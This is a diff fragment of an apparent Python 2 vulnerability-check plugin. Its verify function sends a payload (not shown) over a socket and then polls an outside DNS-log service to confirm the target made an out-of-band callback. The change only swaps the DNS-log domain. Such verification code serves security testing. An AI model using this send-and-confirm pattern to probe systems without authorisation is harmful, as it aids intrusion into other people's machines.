@@ -44,7 +44,7 @@ def verify(task):
         s.send(payload)
         s.close()
         time.sleep(5)
-        req = urllib2.Request("http://dnslog.niufuren.cc/api/dns/devil/%s/" % random_num);
+        req = urllib2.Request("http://dnslog.yoyostay.top/api/dns/devil/%s/" % random_num);
         reqopen = urllib2.urlopen(req)
         if 'True' in reqopen.read():
             ret = {
